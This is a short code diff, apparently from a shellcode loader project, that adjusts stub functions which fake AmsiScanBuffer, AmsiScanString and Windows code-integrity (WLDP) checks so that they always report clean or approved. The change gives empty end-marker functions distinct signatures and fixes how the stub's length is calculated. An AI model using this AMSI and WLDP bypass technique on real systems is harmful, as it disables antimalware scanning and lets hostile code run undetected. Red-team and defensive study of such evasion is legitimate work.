@@ -62,7 +62,7 @@ HRESULT WINAPI AmsiScanBufferStub(
     return S_OK;
 }
 
-VOID AmsiScanBufferStubEnd(VOID) {}
+VOID AmsiScanBufferStubEnd(int a) {}
 
 // fake function that always returns S_OK and AMSI_RESULT_CLEAN
 HRESULT WINAPI AmsiScanStringStub(
@@ -262,7 +262,9 @@ HRESULT WINAPI WldpIsClassInApprovedListStub(
     return S_OK;
 }
 
-VOID WldpIsClassInApprovedListStubEnd(VOID){}
+// make sure prototype is different from other null subroutines
+// to avoid duplication by MSVC
+VOID WldpIsClassInApprovedListStubEnd(int a, int b) {}
 
 // fake function that always returns S_OK
 HRESULT WINAPI WldpQueryDynamicCodeTrustStub(
@@ -273,7 +275,7 @@ HRESULT WINAPI WldpQueryDynamicCodeTrustStub(
     return S_OK;
 }
 
-VOID WldpQueryDynamicCodeTrustStubEnd(VOID){}
+VOID WldpQueryDynamicCodeTrustStubEnd(int a, int b, int c) {}
 
 BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     BOOL    disabled = FALSE;
@@ -291,7 +293,7 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     if(cs == NULL) return FALSE;
     
     // calculate length of stub
-    len = (ULONG_PTR)DisableWLDP -
+    len = (ULONG_PTR)WldpQueryDynamicCodeTrustStubEnd -
           (ULONG_PTR)WldpQueryDynamicCodeTrustStub;
       
     DPRINT("Length of WldpQueryDynamicCodeTrustStub is %" PRIi32 " bytes.", len);
